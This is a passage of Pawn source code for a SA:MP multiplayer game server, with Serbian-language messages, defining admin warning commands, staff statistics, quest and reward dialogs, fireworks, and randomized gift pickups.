	SCMF(id, 0xFF6347FF, "#OGLASWARN: {FFFFFF}Admin {FF6347}%s {FFFFFF}vam je dao oglas warn, {FF6347}[%d/3].", ImeIgraca(playerid), PlayerInfo[id][xOglasWarn]);
	SCMF(playerid, 0xFF6347FF, "#OGLASWARN: {FFFFFF}Igracu {FF6347}%s {FFFFFF}dali ste oglas warn, {FF6347}[%d/3].", ImeIgraca(id), PlayerInfo[id][xOglasWarn]);
	AdminMsg(ADM_WARN, "[ADMIN] %s[%d] je da%s igracu %s[%d] oglas warn (%d/3).", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", ImeIgraca(id), id, PlayerInfo[id][xOglasWarn]);
	WriteLog("log-warn", "Admin %s je dao/la %s oglas warn (%d/3)", ImeIgraca( playerid ), ImeIgraca(id), PlayerInfo[id][xOglasWarn]);
	sql_user_update_integer(id, "xOglasWarn", PlayerInfo[id][xOglasWarn]);

	if(PlayerInfo[id][xOglasWarn] >= 3)
	{
		SendClientMessage(id, 0xFF6347FF, "#OGLASWARN: {FFFFFF}Zbog dostignutog broja oglas warnova od {FF6347}[%d/3] {FFFFFF}izgubili ste mogucnost davanja oglasa.");
	}
	return 1;
}

CMD:roglaswarn(playerid, const params[])
{
    if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) return SendErrorMessage(playerid, "Niste ovlasceni.");

    new id;
    if(sscanf(params, "r", id)) return SendUsageMessage(playerid, "/roglaswarn [id/name]");
    if(id == INVALID_PLAYER_ID) return SendErrorMessage(playerid, "ID/Ime nije konektovano.");
    if(id == playerid) return SendErrorMessage(playerid, "Nemoj sam/a sebi.");
    if(PlayerInfo[id][xOglasWarn] == 0) return SendErrorMessage(playerid, "Igrac nema oglas-warnova.");

    PlayerInfo[id][xOglasWarn]--;
    SCMF(id, 0xFF6347FF, "#OGLASWARN: {FFFFFF}Admin {FF6347}%s {FFFFFF}vam je skinuo oglas warn, {FF6347}[%d/3].", ImeIgraca(playerid), PlayerInfo[id][xOglasWarn]);
    SCMF(playerid, 0xFF6347FF, "#OGLASWARN: {FFFFFF}Igracu {FF6347}%s {FFFFFF}skinuli ste oglas warn, {FF6347}[%d/3].", ImeIgraca(id), PlayerInfo[id][xOglasWarn]);
    AdminMsg(ADM_WARN, "[ADMIN] %s[%d] je skinu%s igracu %s[%d] oglas warn (%d/3).", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", ImeIgraca(id), id, PlayerInfo[id][xOglasWarn]);
    WriteLog("log-warn", "Admin %s je skinuo/la %s oglas warn (%d/3)", ImeIgraca(playerid), ImeIgraca(id), PlayerInfo[id][xOglasWarn]);

    sql_user_update_integer(id, "xOglasWarn", PlayerInfo[id][xOglasWarn]);

    if(PlayerInfo[id][xOglasWarn] == 0)
    {
        SCMF(id, 0xFF6347FF, "#OGLASWARN: {FFFFFF}Ocisceni ste od oglas warnova, za sljedeci put pazite kako postavljate oglase.", PlayerInfo[id][xOglasWarn]);
    }
    return 1;
}

CMD:proverarada(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 4 && PlayerInfo[playerid][xSkriptaRank] != 6 && PlayerInfo[playerid][xSkriptaRank] != 7) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new kjsk[6];
	if(sscanf(params, "s[6]", kjsk)) return SendUsageMessage(playerid, "/proverarada [admin/gm/spec]");

	if(strcmp(kjsk, "admin", true) == 0)
	{
		if(PlayerInfo[playerid][xAdmin] < 4) return SendErrorMessage(playerid, "Samo Admini.");
		mysql_tquery(mSQL, "SELECT `admin_lvl`, `p_name`, `xAGMStats` FROM `users` WHERE `admin_lvl` > 0 ORDER BY `admin_lvl` DESC", "countStatistic", "ii", playerid, 0);
	}
	else if(strcmp(kjsk, "gm", true) == 0)
	{
		if(PlayerInfo[playerid][xAdmin] < 4 && PlayerInfo[playerid][xSkriptaRank] != 7) return SendErrorMessage(playerid, "Samo Admini i vodja gamemastera.");
		mysql_tquery(mSQL, "SELECT `helper_level`, `p_name`, `xAGMStats` FROM `users` WHERE `helper_level` > 0 ORDER BY `helper_level` DESC", "countStatistic", "ii", playerid, 1);
	}
	else if(strcmp(kjsk, "spec", true) == 0)
	{
		if(PlayerInfo[playerid][xAdmin] < 4 && PlayerInfo[playerid][xSkriptaRank] != 6) return SendErrorMessage(playerid, "Samo Admini i vodja spec teama.");
		mysql_tquery(mSQL, "SELECT `xSpecAdmin`, `p_name`, `xAGMStats` FROM `users` WHERE `xSpecAdmin` > 0", "countStatistic", "ii", playerid, 2);
	}
	else SendErrorMessage(playerid, "Pogresan tip.");
	return 1;
}

CMD:resetstaffstats(playerid)
{
	if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Niste ovlasceni.");

	foreach(new i : Player)
	{
		PlayerInfo[i][xAGMStats] = 0;
	}
	mysql_tquery(mSQL, "UPDATE `users` SET `xAGMStats` = '0' WHERE `xAGMStats` > 0");

	AdminMsg(ADM_WARN, "[ADMIN] %s[%d] je resetovao/la statistiku admina/gmova/spec admina.", ImeIgraca(playerid), playerid);
	return 1;
}

CMD:aktivnaigra(playerid)
{
	new str[50];
	format(str, 50, "{5BF067}Aktivna Igra - ({FFFFFF}%d/24{5BF067}):", PlayerInfo[playerid][xAktivnaIgra]);
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, str, 
														"{FFFFFF}Sto je aktivna igra?\n\
														\t- {5BF067}Aktivna igra je sistem koji nagradjuje vasu aktivnost svakog dana.\n\n\
														{FFFFFF}Kako radi?\n\
														\t- {5BF067}Radi na nacin tako sto na 6, 12, 18 i 24h igre u jednom danu dobijete odredjene nagrade.\n\n\
														{FFFFFF}Koje su nagrade?\n\
														\t{FFFFFF}- {5BF067}6h > $50.000 + 50G zlata + 1RP\n\
														\t{FFFFFF}- {5BF067}12h > $75.000 + 75G zlata + 2RP\n\
														\t{FFFFFF}- {5BF067}18h > $150.000 + 150G zlata + 3RP\n\
														\t{FFFFFF}- {5BF067}24h > $250.000 + 250G zlata + 4RP", "OK", "");
	return 1;
}

CMD:top(playerid)
{
	ShowPlayerDialog(playerid, dialog_TOPLISTA, DIALOG_STYLE_LIST, D_NASLOV, 
																				"{4282C0}(1). {FFFFFF}Level\n\
																				{4282C0}(2). {FFFFFF}Sati Igre\n\
																				{4282C0}(3). {FFFFFF}Novac\n\
																				{4282C0}(4). {FFFFFF}Zlato\n\
																				{4282C0}(5). {FFFFFF}DeathMatch\n\
																				{4282C0}(6). {FFFFFF}TeamDeathMatch\n\
																				{4282C0}(7). {FFFFFF}Event\n\
																				{4282C0}(8). {FFFFFF}Paketici", "Odaberi", "Odustani");
	return 1;
}

CMD:zadaci(playerid, const params[]) 
{
	new vrsta[8];
	if(sscanf(params, "s[8]", vrsta)) return SendUsageMessage(playerid, "/zadaci [pocetni/misije]");

	if(strcmp(vrsta, "pocetni", true) == 0)
	{
		new string[1128];
		format(string, sizeof(string), "#\tZADATAK\tSTATUS\tNAGRADA\n\
										{4282C0}(1).\tPodigni novac sa racuna\t%s {FFFFFF}(%s{FFFFFF})\t5g zlata\n\
										{4282C0}(2).\tPolozi vozacki za auto\t%s {FFFFFF}(%s{FFFFFF})\t15g zlata\n\
										{4282C0}(3).\tPolozi vozacki za letjelicu\t%s {FFFFFF}(%s{FFFFFF})\t15g zlata\n\
										{4282C0}(4).\tPolozi vozacki za brod\t%s {FFFFFF}(%s{FFFFFF})\t15g zlata\n\
										{4282C0}(5).\tKupi dozvolu za oruzje\t%s {FFFFFF}(%s{FFFFFF})\t25g zlata + Respekt up (x1)\n\
										{4282C0}(6).\tKupi svoj prvi auto\t%s {FFFFFF}(%s{FFFFFF})\t50g zlata + Respekt up (x4)\n\
										{4282C0}(7).\tKupi svoju prvu imovinu\t%s {FFFFFF}(%s{FFFFFF})\t50g zlata + Respekt up (x4)\n\
										{4282C0}(8).\tKupi svoju prvu firmu\t%s {FFFFFF}(%s{FFFFFF})\t50g zlata + Respekt up (x4)\n\
										{4282C0}(9).\tUdi u organizaciju\t%s {FFFFFF}(%s{FFFFFF})\t10g zlata\n\
										{4282C0}(10).\tOsvoji prvo mjesto na drag utrci ili NSF utrci\t%s {FFFFFF}(%s{FFFFFF})\t100g zlata + Level up (x1)",
			questInfo[playerid][qt_EasyQuest][0] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][0] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][1] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][1] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][2] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][2] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][3] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][3] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][4] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][4] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][5] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][5] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][6] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][6] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][7] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][7] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][8] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][8] == true ? "{469930}+" : "{C14549}-",
			questInfo[playerid][qt_EasyQuest][9] == true ? "{469930}Rijeseno" : "{C14549}Nije rijeseno",
			questInfo[playerid][qt_EasyRewardQuest][9] == true ? "{469930}+" : "{C14549}-");
		ShowPlayerDialog(playerid, dialog_EASYQUEST, DIALOG_STYLE_TABLIST_HEADERS, "Zadaci - Pocetni", string, "Preuzmi", "Zatvori");					
	}
	else if(strcmp(vrsta, "misije", true) == 0)
	{
		SendErrorMessage(playerid, "Trenutno nedostupno...");
	}
	else SendUsageMessage(playerid, "/zadaci [pocetni/misije]");
	return 1;
}

CMD:firework(playerid, const params[])
{
	#if XMAS_MOD == 1

	    if(PlayerInfo[playerid][xFirework] < 1) return SendErrorMessage(playerid, "Nemate vatrometa, kupite ga u marketu.");
	    if(GetPlayerInterior(playerid) != 0) return SendErrorMessage(playerid, "Ne smijete biti u nekom enterijeru.");

	    new id = Iter_Free(iter_FireWork);
	    if(id == -1) return SendErrorMessage(playerid, "Trenutno je kreirano maksimalno vatrometa, sacekajte malo."); 

	    new Float:x, Float:y, Float:z;
	    GetPlayerPos(playerid, x, y, z);
	    GetXYInFrontOfPlayer(playerid, x, y, 1.0);

	    CreateFireWork(id, x, y, z, 5);

	    SendClientMessage(playerid, 0xFF00FFFF, "(VATROMET): {FFFFFF}Vatromet ce krenuti za {FF00FF}5{FFFFFF} sekundi, odmaknite se.");
	    DodajWarnRed("~y~(PLAYER): %s ~w~je napravi%s vatromet ~y~ID(%d).", ImeIgraca(playerid), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", id);

	    PlayerInfo[playerid][xFirework]--;
	    sql_user_update_integer(playerid, "xFirework", PlayerInfo[playerid][xFirework]);

    #else

    	SendErrorMessage(playerid, "Nije ukljucen XMAS mod.");

    #endif
    return 1;
}

CMD:afirework(playerid, const params[])
{
    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Niste ovlasceni.");
    if(GetPlayerInterior(playerid) != 0) return SendErrorMessage(playerid, "Ne smijete biti u nekom enterijeru.");

    new id = Iter_Free(iter_FireWork);
    if(id == -1) return SendErrorMessage(playerid, "Trenutno je kreirano maksimalno vatrometa, sacekajte malo."); 

    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    GetXYInFrontOfPlayer(playerid, x, y, 1.0);

    CreateFireWork(id, x, y, z, (strval(params) < 5) ? 5 : strval(params));

    DodajWarnRed("~y~(ADMIN): %s ~w~je napravi%s vatromet ~y~ID(%d).", ImeIgraca(playerid), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", id);
    SendClientMessage(playerid, 0xFF00FFFF, "(A-VATROMET): {FFFFFF}Vatromet ce krenuti za {FF00FF}5{FFFFFF} sekundi, odmaknite se.");
    return 1;
}

CMD:startgift(playerid)
{
	if(PlayerInfo[playerid][xAdmin] >= 4)
	{
		new id = Iter_Free(iter_Gift);
		if(id == -1) return SendErrorMessage(playerid, "Vec je kreirano maksimalno giftova.");

	    new string[100], 
	    	Float:Pos[3];

	    GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

	    GiftInfo[id][gLabel] = CreateDynamic3DTextLabel("[ GIFT ]\nCOMMAND: {FFFFFF}\"/opengift\"", 0x2EC991FF, Pos[0], Pos[1], Pos[2], 4.0, IPI, IVI, 0, -1, -1, .priority = 32);
	    GiftInfo[id][gObjekt] = CreateDynamicObject(19058, Pos[0], Pos[1], Pos[2]-0.5, 0.0, 0.0, 0.0, .priority = 32);
	    GetZoneName(Float:Pos[0], Float:Pos[1], string, 28);

	    GiftInfo[id][gPosX] = Pos[0];
	    GiftInfo[id][gPosY] = Pos[1];
	    GiftInfo[id][gPosZ] = Pos[2];

	    AdminMsg(ADM_WARN, "[ADMIN] %s je napravi%s gift ID %d.", ImeIgraca(playerid), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", id);
	    SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: Kreiran je gift na {FFFFFF}%s, {2EC991}sretno u potrazi.", string);

	    Iter_Add(iter_Gift, id);
	    SetPlayerPos(playerid, Pos[0], Pos[1]+1, Pos[2]);

	    WriteLog("log-gift", "Admin %s je kreirao gift.", ImeIgraca( playerid ));
	}
	else
	{
		SendErrorMessage(playerid, "Niste ovlasceni.");
	}
	return 1;
}

CMD:stopgift(playerid)
{
	if(PlayerInfo[playerid][xAdmin] >= 4)
	{
		new id = GetNearestGift(playerid);
	    if(id == -1) return SendErrorMessage(playerid, "Niste u blizini nekog gifta.");

	    if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);
	   	if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);

	    GiftInfo[id][gPosX] = 0.0;
	    GiftInfo[id][gPosY] = 0.0;
	    GiftInfo[id][gPosZ] = -1000.0;

	    AdminMsg(ADM_WARN, "[ADMIN] %s je obrisa%s gift ID %d.", ImeIgraca(playerid), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", id);

	    Iter_Remove(iter_Gift, id);
	}
	else
	{
		SendErrorMessage(playerid, "Niste ovlasceni.");
	}
	return 1;
}

CMD:opengift(playerid)
{
	new id = GetNearestGift(playerid);
	if(id == -1) return SendErrorMessage(playerid, "Niste u blizini nekog gifta.");

	WriteLog("log-gift", "Igrac %s je otvorio gift.", ImeIgraca( playerid ));

	new giftt = random(30);
	switch(giftt)
	{
	    case 0..2:
	    {
	        DajIgracuNovac(playerid, 15000);

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}15.000$", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 3..5:
	    {
	        DajIgracuNovac(playerid, 7500);

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}7.500$", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 6..8:
	    {
	        DajIgracuNovac(playerid, 5000);

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}5.000$", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 9..11:
	    {
	        DajIgracuNovac(playerid, 12500);

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}12.500$", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 12:
	    {
	        PlayerInfo[ playerid ][ xLevel ] += 1;
         	SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
          	sql_user_update_integer( playerid, "level", PlayerInfo[ playerid ][ xLevel ] );

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}1 LEVEL UP", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

	        Iter_Remove(iter_Gift, id);
	    }
	    case 13..15:
	    {
	        PlayerInfo[ playerid ][ xZlato ] += 100;
			sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}100G ZLATA", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 16:
	    {
	        PlayerInfo[playerid][xUPoen]++;
	        sql_user_update_integer( playerid, "xUPoen", PlayerInfo[ playerid ][ xUPoen ] );

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}1 U-POEN", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 17..19:
	    {
	        PlayerInfo[ playerid ][ xZlato ] += 50;
			sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}50G ZLATA", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 20..22:
	    {
	        DajIgracuNovac(playerid, 10000);

	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}10.000$", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
	    }
	    case 23..26:
	    {
	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}RESPEKT UP x1", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

            PlayerInfo[ playerid ][ xRespekt ] += 1;
		            
            new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1, expamount = nxtlevel*levelexp;
			if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
			{
				format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
				GameTextForPlayer( playerid, globalstring, 5000, 1);
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
				PlayerPlayMusic( playerid );
				PlayerInfo[ playerid ][ xLevel ]++;
				SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
				PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
	            PlayerInfo[ playerid ][ xRespekt ] = 0;
				SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
				SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

            	new q[ 120 ];
				mysql_format( mSQL, q, sizeof(q),
					"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
						PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
				mysql_tquery( mSQL, q );

				if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 ) {
				    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT ) {
						PlayerInfo[ playerid ][ xSlotoviVozila ]++;
						SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

						sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
					}
				}
			}
			else
			{
				sql_user_update_integer( playerid, "exp", PlayerInfo[ playerid ][ xRespekt ] );
			}
			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
		}
	    case 27..29:
	    {
	        SendClientMessageToAllEx(0x2EC991FF, "[GIFT]: {FFFFFF}%s[%d] je pronasa%s gift i pokupi%s nagradu: {2EC991}RESPEKT UP x2", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la");

            PlayerInfo[ playerid ][ xRespekt ] += 2;
		            
            new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1, expamount = nxtlevel*levelexp;
			if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
			{
				format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
				GameTextForPlayer( playerid, globalstring, 5000, 1);
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
				PlayerPlayMusic( playerid );
				PlayerInfo[ playerid ][ xLevel ]++;
				SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
				PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
	            PlayerInfo[ playerid ][ xRespekt ] = 0;
				SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
				SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

            	new q[ 120 ];
				mysql_format( mSQL, q, sizeof(q),
					"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
						PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
				mysql_tquery( mSQL, q );

				if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 ) {
				    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT ) {
						PlayerInfo[ playerid ][ xSlotoviVozila ]++;
						SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

						sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
					}
				}
			}
			else
			{
				sql_user_update_integer( playerid, "exp", PlayerInfo[ playerid ][ xRespekt ] );
			}
			if(IsValidDynamicObject(GiftInfo[id][gObjekt])) DestroyDynamicObject(GiftInfo[id][gObjekt]);
			if(IsValidDynamic3DTextLabel(GiftInfo[id][gLabel])) DestroyDynamic3DTextLabel(GiftInfo[id][gLabel]);

			Iter_Remove(iter_Gift, id);
		}
    }
	return 1;
}

CMD:reklama(playerid, const params[])
{
	if(PlayerInfo[playerid][xGamemaster] < 1 && PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) return SendErrorMessage(playerid, "Niste ovlasceni.");
	if(gettime() < KoriscenaReklama) return SendErrorMessage(playerid, "Mozete koristiti [ /reklama ] za (%d) sec.", KoriscenaReklama - gettime());

	new vrsta[20];
	if(sscanf(params, "s[20]", vrsta)) return SendUsageMessage(playerid, "/reklama [discord/forum/teamspeak]");

	if(strcmp(vrsta, "discord", true) == 0)
	{
	    SendClientMessageToAll(-1, "======================== {4BD1C3}[ U - DISCORD ] {FFFFFF}========================");
	    SendClientMessageToAll(-1, "  > Ako vam se svidja nas SA:MP server posjetite i nas Discord server.");
	    SendClientMessageToAll(-1, "  > Discord koristimo radi lakse i brze komunikacije sa igracima.");
	    SendClientMessageToAll(-1, "  > Takodjer na nasem Discord serveru mozete pronaci i sobe za muziku uz 24/7 DJ-a.");
	    SendClientMessageToAll(-1, "  > Sve o Discordu kao i nas IP Discorda imate na {4BD1C3}[ /discord ].");
	    SendClientMessageToAll(-1, "===================== {4BD1C3}[ "SERVER_WEB" ] {FFFFFF}====================");

	    GMChat(ADM_WARN, "[ADMIN] %s je postavi%s reklamu za Discord.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));

	    PlayerInfo[ playerid ][ xAGMStats ] += 4;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

	    KoriscenaReklama = gettime()+600;
	}
	else if(strcmp(vrsta, "forum", true) == 0)
	{
		SendClientMessageToAll(-1, "========================== {4BD1C3}[ U - FORUM ] {FFFFFF}==========================");
	    SendClientMessageToAll(-1, "  > Ako vam se svidja nas SA:MP server posjetite i nas forum.");
